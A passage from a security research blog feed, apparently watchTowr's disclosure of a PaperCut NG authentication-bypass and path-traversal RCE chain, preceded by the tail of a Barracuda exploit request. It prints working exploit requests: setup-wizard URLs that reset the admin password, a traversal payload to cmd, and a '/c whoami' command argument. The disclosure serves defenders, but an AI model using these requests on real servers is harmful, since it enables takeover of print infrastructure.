+Content-Disposition: form-data; name=&quot;user&quot;
+
+admin
+--BOUNDARY
+Content-Disposition: form-data; name=&quot;new_password&quot;
+
+one
+--BOUNDARY
+Content-Disposition: form-data; name=&quot;retype_password&quot;
+
+two
+--BOUNDARY
+Content-Disposition: form-data; name=&quot;UPDATE_activation_code&quot;
+
+1
+--BOUNDARY
+Content-Disposition: form-data; name=&quot;pu_bayesian_upload&quot;
+
+1
+--BOUNDARY
+Content-Disposition: form-data; name=&quot;bayesian&quot;; filename=&quot;poc.bak&quot;
+Content-Type: application/octet-stream
+
+&lt;TAR BACKUP&gt;
+--BOUNDARY--
+</code></pre><figure class="kg-card kg-video-card kg-width-regular" data-kg-thumbnail="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda-1_thumb.jpg" data-kg-custom-thumbnail>
+            <div class="kg-video-container">
+                <video src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda-1.mp4" poster="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda-1_thumb.jpg" width="3840" height="2160" playsinline preload="metadata" controls></video>
+                
+                
+            </div>
+            
+        </figure><h3 id="detection-artefact-generator">Detection Artefact Generator</h3><p>As always, we are sharing our Detection Artefact Generator so you can determine your own susceptibility and inform remediation in your own environments.</p><p>It can be found on our GitHub <a href="https://github.com/watchtowrlabs/watchTowr-vs-Barracuda-RCE-CVE-2026-116606-CVE-2026-111560?ref=labs.watchtowr.com" rel="noreferrer">here</a>.</p>]]></content:encoded></item><item><title><![CDATA[Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)]]></title><description><![CDATA[<blockquote>Before we begin, yes - it&apos;s confusing. There are more vulnerabilities with watchTowr IDs in this blog post than there are CVE IDs (assigned by PaperCut), due to PaperCut bundling vulnerabilities and then patch bypasses for those same vulnerabilities into singular CVE IDs.</blockquote><p>Paper! It still exists.</p><p>We have</p>]]></description><link>https://labs.watchtowr.com/death-by-a-thousand-papercuts-papercut-pre-auth-rce-chain-and-patch-bypasses-wt-2026-0141-0144-cve-2026-82077-cve-2026-82078-cve-2026-81578/</link><guid isPermaLink="false">6ac86bf724ecd40001ba63e1</guid><dc:creator><![CDATA[Piotr Bazydlo (@chudyPB)]]></dc:creator><pubDate>Fri, 09 Oct 2026 17:31:14 GMT</pubDate><media:content url="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/papercut.png" medium="image"/><content:encoded><![CDATA[<blockquote>Before we begin, yes - it&apos;s confusing. There are more vulnerabilities with watchTowr IDs in this blog post than there are CVE IDs (assigned by PaperCut), due to PaperCut bundling vulnerabilities and then patch bypasses for those same vulnerabilities into singular CVE IDs.</blockquote><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/papercut.png" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)"><p>Paper! It still exists.</p><p>We have to admit it - so much is happening right now (F1, GTA6, breakfast) that we barely have time to lovingly tease our most favoritest vendors. </p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-10.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="500" height="810"></figure><p>On Thursday, 27 August 2026, PaperCut published an <a href="https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/?ref=labs.watchtowr.com">advisory</a> claiming that a mysterious vulnerability was being exploited in-the-wild, leading to system compromise.</p><p>The watchTowr Intel team has documented the in-the-wild exploitation that our global honeypot network, Attacker Eye, captured <a href="https://watchtowr.com/intelligence/papercut-ng-mf-zero-day-cve-2026-81578-cve-2026-82078-active-exploitation-underway/?ref=labs.watchtowr.com">here</a>.</p><p>To add insult to injury, when PaperCut released their advisory, they did so without a patch. Unlike other vendors that struggle to communicate at all, PaperCut provided IOCs in the form of log snippets related to exploitation and temporary mitigations, enabling their customers to take action.</p><p>That said, much of the information remained unclear.</p><ul><li>How many vulnerabilities were exploited in this chain?</li><li>Did any of them require authentication?</li><li>Were the attackers exploiting post-authentication vulnerabilities?</li><li>Which components were vulnerable?</li></ul><p>As mere mortals, we knew absolutely nothing at this point. A familiar feeling.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-19.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="480" height="360"></figure><p>PaperCut is <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ref=labs.watchtowr.com">no stranger</a> to the exploitation of vulnerabilities in the wild. They&apos;ve had their fair share of ransomware gang attention and, of course, live to tell the tale with their CISA KEV trophy.</p><h3 id="what-is-papercut">What is PaperCut?</h3><p>For those unaware, PaperCut is print management software that helps organizations monitor, control, and secure printing across their networks. Its core features include print quotas, secure release printing (a job is released only after the user logs in at the printer), cost tracking, and detailed reporting. Together, these cut printing costs, reduce paper waste, and prevent unauthorized use.</p><p>It is widely used by schools, universities, healthcare providers, government agencies, law firms, and businesses of all sizes. That mix makes it an attractive target for APTs and ransomware gangs, as proven by several vulnerabilities previously exploited in the wild (such as CVE-2023-27351 and CVE-2023-27350).</p><h3 id="tldr-timeline">TL;DR Timeline</h3><p>There was a lot happening between 27 August and 1 September, so let us give you the full timeline, including some spoilers.</p><blockquote>Author&apos;s note: even though CVEs were assigned after two rounds of patches, we use the CVE numbers from the beginning of this timeline. This is to avoid confusion between vulnerabilities.</blockquote><p><strong>27 August 2026</strong></p><ul><li>PaperCut publishes <a href="https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/?ref=labs.watchtowr.com">an advisory</a> concerning a vulnerability being exploited in the wild targeting 26.0.3. Advisory comes with no patch - exploited vulnerabilities are still not patched.</li><li>At this time, no CVEs were assigned, and only IOCs were published (no vulnerability details, no patch was available).</li><li>With no details about the vulnerabilities or their count, we started working blindly from the IOCs to reproduce them. We had no patch available, thus we had to discover the 0-day vulnerabilities from scratch.</li><li>Using the unpatched PaperCut version, we found the Post-Auth RCE vulnerability (later identified as CVE-2026-82078), which matched the ITW IOCs shared by PaperCut.<ul><li>However, we did not yet know how to exploit this vulnerability without authentication.</li></ul></li><li>PaperCut releases a patch (26.0.4 for PaperCut NG). At this point, we can finally perform patch diffing, which may help us find a way to exploit the Post-Auth RCE without authentication.</li><li>We analyzed the code changes in 26.0.4, enabling us to confirm that we had correctly reproduced CVE-2026-82078 (Post-Auth RCE) and to identify and reproduce CVE-2026-81578 (Authentication Bypass), the full in-the-wild exploitation chain.</li><li>However, during this process, we identified a way to bypass the patch for CVE-2026-82078 (Post-Auth RCE)<ul><li>This was reported to PaperCut and tracked internally as WT-2026-0141.</li></ul></li></ul><p><strong>28 August 2026</strong></p><ul><li>We realized we&#x2019;d identified a mechanism to bypass the patch for CVE-2026-81578 (Authentication Bypass vulnerability)<ul><li>This was reported to PaperCut and tracked internally as WT-2026-0142.</li></ul></li><li>This meant we now had a full Pre-Auth RCE chain again (working against the (at the time) newest version, 26.0.4), by combining :<ul><li>WT-2026-0141 - Post-Auth RCE vulnerability.</li><li>WT-2026-0142 - Authentication Bypass vulnerability.</li></ul></li><li>Rapidly, PaperCut released another patch - publicly known as <strong>26.0.4-PO build 76508,</strong> which contained fixes for:<ul><li>WT-2026-0141 - Post-Auth RCE vulnerability.</li><li>WT-2026-0142 - Authentication Bypass vulnerability.</li></ul></li><li>Once again, we found ourselves analyzing <strong>26.0.4-PO build 76508</strong> and identified a mechanism to bypass the fix for WT-2026-0142, the Authentication Bypass.<ul><li>This was reported to PaperCut and tracked internally as WT-2026-0143.</li></ul></li></ul><p><strong>31 August 2026</strong></p><ul><li>Like a dog with a bone, we then stumbled upon a completely new Post-Auth RCE vulnerability while analyzing the <strong>26.0.4-PO build 76508.</strong></li><li>This was reported to PaperCut and tracked internally as WT-2026-0144 (now known as CVE-2026-82077).</li><li>This meant we now had a full Pre-Auth RCE chain again, by combining :<ul><li>WT-2026-0143 Authentication Bypass vulnerability and</li><li>WT-2026-0144 (CVE-2026-82077) Post-Auth RCE vulnerability.</li></ul></li></ul><p><strong>1 September 2026</strong></p><ul><li>PaperCut releases a new patch, <strong>26.0.4-PO build 76530.</strong><ul><li>Patch contains a fix for: WT-2026-0143 (Authentication Bypass)</li></ul></li></ul><p><strong>10 September 2026</strong></p><ul><li>PaperCut releases a new patch, <strong>26.0.5</strong><ul><li>Patch contains a fix for: WT-2026-0144/CVE-2026-82077 (Post-Auth RCE)</li></ul></li></ul><h3 id="covered-in-papercuts">Covered In PaperCuts</h3><p>So to summarize - tl;dr there are a lot of vulnerabilities. Let&#x2019;s summarise below:</p><p><strong>Exploited In The Wild (Version 26.0.3)</strong></p><ul><li>Yeeted across the internet:<ul><li>CVE-2026-81578 (Authentication Bypass)</li><li>CVE-2026-82078 (Post-Auth RCE)</li></ul></li></ul><p>Then&#x2026;.. it continued.</p><p><strong>First Patch (Version 26.0.4)</strong></p><ul><li>Vulnerabilities discovered by watchTowr while analyzing patches:<ul><li>WT-2026-0141 (no CVE assigned)<ul><li>A bypass of CVE-2026-82078 (Post-Auth RCE) patch.</li></ul></li><li>WT-2026-0142 (no CVE assigned)<ul><li>A bypass of CVE-2026-81578 (Authentication Bypass) patch.</li></ul></li></ul></li></ul><p>Second Patch (<strong>Version 26.0.4-PO build 76508)</strong></p><ul><li>Vulnerabilities discovered by watchTowr while analyzing patches:<ul><li>WT-2026-0143 (no CVE assigned)<ul><li>A bypass of WT-2026-0142 (Authentication Bypass) patch.</li></ul></li><li>CVE-2026-82077 / WT-2026-0144<ul><li>A completely new Post-Auth RCE was discovered, finalizing the chain with WT-2026-0143 Authentication Bypass.</li></ul></li></ul></li></ul><p>We know what you&apos;re going to say already - &#x201c;watchTowr, are you insane? There&apos;s already an analysis published. Why would you rewrite already existing analysis?&#x201d;</p><p>As you can see from the above, dear reader, it has been a saga. So today, we are going to be walking through vulnerabilities identified in version 26.0.4-PO build 76508 (and briefly mentioned above):</p><ul><li>WT-2026-0143: Authentication Bypass vulnerability (which received no CVE assignment).</li><li>WT-2026-0144 (CVE-2026-82077) Post-Auth RCE vulnerability.</li></ul><p>Why these two? For these reasons below.</p><ul><li>They&#x2019;re super cool.</li><li>They enable a full unauthenticated RCE chain on Papercut 26.0.4-PO build 76508</li><li>They haven&#x2019;t been documented yet (hopefully this also makes us cool)</li><li>WT-2026-0143 and WT-2026-0144 (CVE-2026-82077) are new and shiny</li></ul><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-18.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="500" height="852"></figure><h3 id="bypassing-the-patch-2604-po-build-76508-to-the-authentication-bypass-bypass">Bypassing the Patch (26.0.4-PO build 76508) to the Authentication Bypass Bypass</h3><p>Tl;dr this is about WT-2026-0143, which is a bypass of the patch of the bypass for CVE-2026-81579.</p><p>We assume you have probably already read, reviewed and memorised <a href="https://www.techanarchy.net/from-patch-to-exploit-using-claude-code-to-reverse-engineer-a-zero-day-in-papercut-ng/?ref=labs.watchtowr.com">an analysis of the Authentication Bypass</a> (CVE-2026-81578 ) that was exploited in-the-wild and identified in version 26.0.3.</p><p>You may also have seen technical analysis of the first bypasses, which affected 26.0.4, the first patch released by PaperCut.</p><blockquote>Editor: This is patch hell and honestly I can barely keep up.</blockquote><p>If not, sorry - you can Google for it. &#x201c;Me too&#x201d; content receives strong disapproval from our furry friends, who are already upset that we are considering replacing them with an LLM.</p><p>Long story short: PaperCut uses the Apache Tapestry 3 framework to handle web pages. PaperCut also has multiple pages implemented as Java classes, each with its own set of permissions.</p><p>We define the page or form to visit using the Tapestry <code>service</code> parameter.</p><p>The issue was that PaperCut did not foresee a situation where you:</p><ul><li>Define an unauthenticated page (like <code>LogonMessage</code>) in the <code>service</code> parameter, which becomes the root page.</li><li>Then define another page and its form to invoke, which requires authentication.</li></ul><p>The result? An unauthenticated attacker can reach the forms of authenticated pages.</p><p>This behavior can be exploited through a single request using the <code>service</code> parameter, like this:</p><pre><code>service=direct/1/LogonMessage/ConfigEditor/quickFindForm
+</code></pre><p>Why? How? Magic.</p><p>This particular strain of magic, though, is Apache Tapestry magic, which is more than happy to invoke the root page and the subsequent pages defined within the <code>service</code>. We first reach <code>LogonMessage</code>, then jump into the <code>ConfigEditor</code> page and its <code>quickFindForm</code> form.</p><p>Wait, is there no authorization implemented in PaperCut? Well, there is. Authorization is implemented in the <code>BasePaperCutPage.pageValidate</code> method, which is extended by multiple pages (like <code>LogonMessage</code>). However, the code only checks authorization for the root page, so <code>LogonMessage</code> in our case, this page does not require authentication. Again, the possibility of defining multiple pages within a single <code>service</code> parameter was not included in the authorization logic.</p><p><strong>Wait, we think we have seen something like this.</strong> This gave us flashbacks to our <a href="https://labs.watchtowr.com/buy-a-help-desk-bundle-a-remote-access-solution-solarwinds-web-help-desk-pre-auth-rce-chain-s/">SolarWinds Web Help Desk research</a>. If you recall, or unfortunately are still upset about wasting the time to read our blog post, you&apos;ll remember that we found multiple Authentication Bypasses because SolarWinds WHD used a WebObjects framework that has been obsolete since we were 10 years old.</p><p>Those bypasses were extremely hard to find because nobody younger than 50 really knows how those frameworks work.</p><p>And everybody over 50 who knows said frameworks hates them so much that they would rather deploy a leading SSLVPN solution.</p><p>Today, we face a similar situation. Apache Tapestry 3, which has been obsolete for roughly 20 years, is not well known among security researchers.</p><p>And apparently the developers that use it don&apos;t really know it either.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-17.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="503" height="497"></figure><h3 id="the-latest-authentication-bypass-wt-2026-0143-for-2604-po-build-76508-patch">The Latest Authentication Bypass (WT-2026-0143) for 26.0.4-PO build 76508 Patch</h3><p>&#x201c;God, shut up watchTowr&#x201d; - yes, OK.</p><p>We&#x2019;ve now explained at least the base behavior behind CVE-2026-81578. In PaperCut patch 1 season 1 (26.0.4), a temporary protection was implemented to block certain attack vectors.</p><p>For instance:</p><ul><li>An additional recursive page permission check was implemented in <code>BasePaperCutPage.pageValidate</code>, so bypassing with the <code>LogonMessage</code> page was no longer possible.</li><li>It turned out you could use the <code>Home</code> page, which does not extend <code>BasePaperCutPage</code>, to bypass the patch again.</li><li>So the next patch added manual authorization checks to forms belonging to sensitive pages, like <code>ConfigEditor</code> (which was exploited in the wild, by the way).</li></ul><p>Still, without a global authorization check implemented for all pages, it is hard to keep track and manually verify every page in the codebase.</p><p>And that is how we realized it was still possible to abuse the Setup Wizard forms, since they had been completely ignored in the patches delivered up to that point.</p><p>As you can imagine, PaperCut has an initial setup procedure:</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-16.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="1310" height="711" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-16.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-16.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-16.png 1310w" sizes="(min-width: 720px) 720px"></figure><p>As you can see, there are several subpages, such as <code>Create Account</code> or <code>Choose Organization Type</code>.</p><p>After the initial product setup, PaperCut sets <code>system.setup-completed</code> to <code>Y</code>.</p><p>Why does this matter? Every setup subpage (like <code>SetupAdmin</code>) extends <code>BaseSetupPage</code>, which implements the following authorization method:</p><pre><code class="language-java">public void pageValidate(PageEvent event) {
+    WebUtils.ensureCompatibleBrowserForAdmin(event.getRequestCycle().getRequestContext().getRequest());
+    if (this.getConfigManager().getBoolean(&quot;system.setup-completed&quot;)) {
+        WebUtils.redirectToPage(event.getRequestCycle().getPage(&quot;Home&quot;));
+    }
+}
+</code></pre><p>If <code>system.setup-completed</code> returns <code>true</code>, we get redirected and the setup pages are not triggered. And here comes our authentication bypass.</p><p>Imagine that you want to access one of the setup pages (<code>SetupAdmin</code>), after the setup had already been completed.</p><p>You might think you could do this, you could do this with the <code>service</code> parameter set to <code>direct/1/SetupAdmin/&#x24;Form</code>. However, this wouldn&#x2019;t work, as the code would invoke the <code>BaseSetupPage.pageValidate</code> (presented above, used by SetupAdmin), and would thus redirect us back to <code>Home</code> , instead of executing the setup form.</p><p>However, we can navigate directly to every stage of the Setup Wizard form by accessing it through the <code>Home</code> page, even though the product has already been deployed.</p><p>Why? Let&#x2019;s walk through it step by step:</p><ul><li>You invoke a sample setup page through the <code>Home</code> page (via the service parameter), like this: <code>/app?service=direct/1/Home/SetupAdmin/&#x24;Form</code> (we want to reach <code>SetupAdmin</code> pre-auth, via <code>Home</code> ).</li><li>The framework will therefore try to invoke <code>Home.pageValidate</code> to verify your privileges, but will skip the <code>SetupAdmin.pageValidate</code> method (it won&#x2019;t get called).</li><li><code>Home</code> can be accessed pre-auth, thus an unauthenticated attacker is not getting blocked, and they successfully reach the <code>SetupAdmin</code> page.</li></ul><p>Setup pages <code>pageValidate</code> method will never be called (thanks to the bypass), so the <code>system.setup-completed</code> value is irrelevant for the attacker.</p><p>If you wish to reset the admin&#x2019;s password using the setup process, you need to go through it step by step. It means you need to invoke each setup page using the authentication bypass. The full process consists of four requests:</p><ul><li><code>POST /app?service=direct/1/Home/SetupAdmin/&#x24;Form</code> - Change the admin&apos;s password here.</li><li><code>POST /app?service=direct/1/Home/SetupOrgType/&#x24;Form</code> - Set the organization type here.</li><li><code>POST /app?service=direct/1/Home/SetupUserSource/&#x24;Form</code> - Pick user synchronization sources here (we chose to perform no synchronization in our PoC).</li><li><code>POST /app?service=direct/1/Home/SetupVerify/&#x24;Form</code> - Confirm that the setup is completed here.</li></ul><p>Voila. You have forced the execution of a &#x201c;fresh fresh&#x201d; product setup and successfully modified the admin user password, concluding our explanation of the Authentication Bypass (WT-2026-0143 ) that worked against version 26.0.4-PO build 76508.</p><p>Just for fun, let&#x2019;s show this working within our Detection Artifact Generator:</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-15.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="589" height="162"></figure><p>So, what next? We want more (RCE, we want RCE).</p><h3 id="post-auth-rce-wt-2026-0144-cve-2026-82077">Post-Auth RCE: WT-2026-0144 (CVE-2026-82077)</h3><p>Now, as you&apos;ve seen above, we&apos;ve demonstrated that WT-2026-0143 can be used to bypass authentication and modify the admin password on the latest version (at the time) of PaperCut: version 26.0.4-PO build 76508.</p><p>Now, post-patch, the original in-the-wild exploited post-auth RCE vulnerability was effectively &#x201c;completely removed&#x201d; with changes made to the <code>security.properties</code>. file. If you recall, that vulnerability was based on controlling the JDBC connection URL and triggering arbitrary connections, and was blocked through the <code>security.properties</code> config file.</p><p>With one route blocked, and a lot of remaining functionality to poke - we thought it was worth looking for a new route.</p><p>After some time, our eyes settled on the <code>Scan to Fax</code> functionality. Why? Because this functionality ultimately leads to the execution of OS commands, making it a no-brainer to investigate.</p><p>With the proper definition of job services, an attacker can reach the <code>biz.papercut.pcng.service.scan.FaxProviderManagerImpl.sendFaxJob</code> method, and the input argument of type <code>ScanFaxJob</code> is fully attacker-controlled.</p><pre><code class="language-java">public void sendFaxJob(ScanFaxJob job) throws RuntimeException, InterruptedException { // [1]
+    logger.debug(&quot;Sending fax job {} to provider {}&quot;, job.getFaxJob(), job.getProviderConnector());
+    FaxJob faxJob = job.getFaxJob();
+
+    String jobStr;
+    try {
+       jobStr = this.convertFaxJobToJSON(faxJob);
+    } catch (IOException var12) {
+       logger.error(&quot;Unable to convert fax job {} to JSON file&quot;, job.getFaxJob());
+       throw new IllegalArgumentException(&quot;Unable to convert fax job to JSON file&quot;);
+    }
+
+    Path jobFile = this.createStringJsonFile(jobStr, &quot;papercut-scan-fax-job&quot;);
+    if (jobFile == null) {
+       throw new IllegalArgumentException(&quot;Unable to create fax job file&quot;);
+    } else {
+       Path settingsFile = this.createStringJsonFile(job.getProviderSettingsJson(), &quot;papercut-scan-fax-settings&quot;);
+       if (settingsFile == null) {
+          this.deleteTmpFile(jobFile);
+          throw new IllegalArgumentException(&quot;Unable to create fax settings file&quot;);
+       } else {
+          String template = this.configManager.getString(&quot;system.scan.fax.send.command-args&quot;); // [2]
+          String testOptions = this.configManager.getString(&quot;system.scan.fax.test.options&quot;);
+          logger.debug(&quot;Using the following fax connector template: &apos;{}&apos;&quot;, template);
+          logger.debug(&quot;Using job contents of: {}&quot;, jobStr);
+          String[] cmdArray = (String[])Arrays.stream(template.split(&quot;\\s+&quot;)).map((str) -&gt; str.replace(&quot;%job%&quot;, this.quote(jobFile.toAbsolutePath().toString())).replace(&quot;%settings%&quot;, this.quote(settingsFile.toAbsolutePath().toString())).replace(&quot;%test-options%&quot;, testOptions)).toArray((x&#x24;0) -&gt; new String[x&#x24;0]); // [3]
+
+          try {
+             this.runCommand(job.getProviderConnector(), cmdArray, this.configManager.getIntegerWithDefault(&quot;system.scan.fax.send.timeout-secs&quot;, 30)); // [4]
+          } finally {
+             if (!testOptions.contains(&quot;-o keeptmp=Y&quot;)) {
+                this.deleteTmpFile(jobFile);
+                this.deleteTmpFile(settingsFile);
+             }
+          }
+       }
+    }
+ }
+</code></pre><ol><li>At <code>[1]</code>, the <code>sendFaxJob</code> method is defined with the attacker-controlled <code>ScanFaxJob</code> object.</li><li>At <code>[2]</code>, the code extracts the <code>system.scan.fax.send.command-args</code> setting and stores it as the <code>template</code> option.</li><li>At <code>[3]</code>, the code creates the <code>cmdArray</code>, which is based on the <code>template</code>.</li><li>At <code>[4]</code>, <code>runCommand</code> is executed, and the first argument is the attacker-controlled value from <code>job.getProviderConnector</code>.</li></ol><p>Looking at the code snippet below, we can see the implementation of <code>ScanFaxJob</code>:</p><pre><code class="language-java">public class ScanFaxJob {
+   FaxJob faxJob;
+   String providerConnector;
+   String providerSettingsJson;
+
+   public ScanFaxJob(String providerConnector, String providerSettingsJson, FaxJob faxJob) {
+      this.providerConnector = providerConnector;
+      this.providerSettingsJson = providerSettingsJson;
+      this.faxJob = faxJob;
+   }
+
+   public FaxJob getFaxJob() {
+      return this.faxJob;
+   }
+
+   public String getProviderSettingsJson() {
+      return this.providerSettingsJson;
+   }
+
+   public String getProviderConnector() {
+      return this.providerConnector;
+   }
+}
+</code></pre><p>The <code>providerConnector</code> member is not verified at any point, giving us more hope&#x2026;</p><p>Let&apos;s have a look at <code>runCommand</code>:</p><pre><code class="language-java">private String runCommand(String connector, String[] cmdArray, final int timeOutSecs) throws RuntimeException, InterruptedException {
+  StringBuffer stdout = new StringBuffer();
+  StringBuffer stderr = new StringBuffer();
+  int exitCode = this.runCommandBuffers(connector, cmdArray, timeOutSecs, stdout, stderr); // [1]
+  if (exitCode != 0) {
+     throw new RuntimeException(&quot;Fax connector failed: &quot; + cmdArray[0]);
+  } else {
+     return stdout.toString();
+  }
+}
+</code></pre><p>At <code>[1]</code>, it calls <code>runCommandBuffers</code>:</p><pre><code class="language-java">private int runCommandBuffers(String connector, String[] cmdArray, final int timeOutSecs, StringBuffer stdout, StringBuffer stderr) throws InterruptedException, RuntimeException {
+  if (stdout == null) {
+     stdout = new StringBuffer();
+  }
+
+  if (stderr == null) {
+     stderr = new StringBuffer();
+  }
+
+  cmdArray = (String[])ObjectArrays.concat(this.getAbsoluteBinaryPath(connector), cmdArray); // [1]
+  String cmdLine = String.join(System.lineSeparator(), cmdArray);
+  logger.debug(&quot;Using the fax connector with an adjusted path \&quot;{}\&quot;&quot;, cmdLine);
+
+  try {
+     int exitCode = ProcessUtils.execAndGetOutput(cmdArray, (boolean[])null, stdout, stderr, timeOutSecs); // [2]
+  //...
+}
+</code></pre><ol><li><code>[1]</code>, it creates a new <code>cmdArray</code>, but the attacker-controlled <code>connector</code> is passed through <code>getAbsoluteBinaryPath</code> first.</li><li>At <code>[2]</code>, it executes the command using <code>ProcessUtils.execAndGetOutput</code>.</li></ol><p>The final part of the puzzle is found within <code>getAbsoluteBinaryPath</code>:</p><pre><code class="language-java">private String getAbsoluteBinaryPath(final String commandName) {
+  String var10000 = this.getFaxConnectorDirPath(); // [1]
+  String path = var10000 + File.separator + commandName; // [2]
+  logger.debug(&quot;Getting absolute path: {}&quot;, path);
+  if (Files.isExecutable(Paths.get(path))) {
+     return path;
+  } else {
+     path = path + &quot;.exe&quot;;
+     if (Files.isExecutable(Paths.get(path))) {
+        return path;
+     } else {
+        logger.error(&quot;Could fax connector not be executable: {}&quot;, commandName);
+        throw new RuntimeException(path + &quot; is not executable&quot;);
+     }
+  }
+}
+</code></pre><ol><li>At <code>[1]</code>, it extracts the directory for the fax connector.</li><li>At <code>[2]</code>, it appends our connector string to this directory with no validation. Of course, the validation is not performed here either, so we are dealing with a <strong>Relative Path Traversal</strong>.</li></ol><p>To sum up, the attacker can:</p><ul><li>Create a new <code>ScanFaxJob</code> where the <code>providerConnector</code> is set to, for example, <code>../../../../../../../../../../../../../Windows/System32/cmd</code>. One can do this with the following HTTP request:</li></ul><pre><code>POST /app HTTP/1.1
+Host: target:9191
+Origin: &lt;http://target:9191&gt;
+Cookie: org.apache.tapestry.locale=en; JSESSIONID=cookie
+Content-Length: 6853
+Content-Type: application/x-www-form-urlencoded
+
+scanActionType=FAX&amp;label=test&amp;faxProviderModel=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Ccmd&amp;...removedforreadability...
+</code></pre><ul><li>Modify the <code>system.scan.fax.send.command-args</code> config parameter to, for example, <code>/c whoami</code> (through the Config Editor page):</li></ul><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-14.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="1048" height="401" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-14.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-14.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-14.png 1048w" sizes="(min-width: 720px) 720px"></figure><ul><li>Trigger a new scan to fax job.</li><li>Profit.</li></ul><p></p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-13.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="611" height="281" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-13.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-13.png 611w"></figure><p>And there we have it - a new Post-Auth RCE (CVE-2026-82077 / WT-2026-0144), allowing us to finalize the entire chain to RCE, with our Authentication Bypass (WT-2026-0143).</p><h3 id="full-chain">Full Chain</h3><p>Tying it all together (WT-2026-0143 + WT-2026-0144/CVE-2026-82077), we can finally pop a shell against PaperCut NG 26.0.4-PO build 76508.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-12.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and 